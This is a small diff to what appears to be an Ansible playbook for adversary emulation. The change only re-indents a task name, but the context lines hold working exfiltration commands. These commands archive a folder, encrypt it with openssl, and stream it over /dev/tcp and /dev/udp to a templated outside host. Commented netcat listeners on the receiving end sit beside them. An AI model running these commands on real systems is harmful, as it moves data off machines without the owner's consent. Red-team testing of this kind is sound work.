@@ -23,7 +23,7 @@
         tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }} 
         # netcat -lvp > {{ exfiltration_file }}-tcp.tar.gz.enc
       when: exfil_check.stat.exists
-     - name: Exfiltration Over Alternative Protocol UDP
+    - name: Exfiltration Over Alternative Protocol UDP
       shell: |
         tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | /dev/udp/{{ exfil_fqdn }}/{{ exfil_port }} 
         # netcat -luvp > {{ exfiltration_file }}-udp.tar.gz.enc
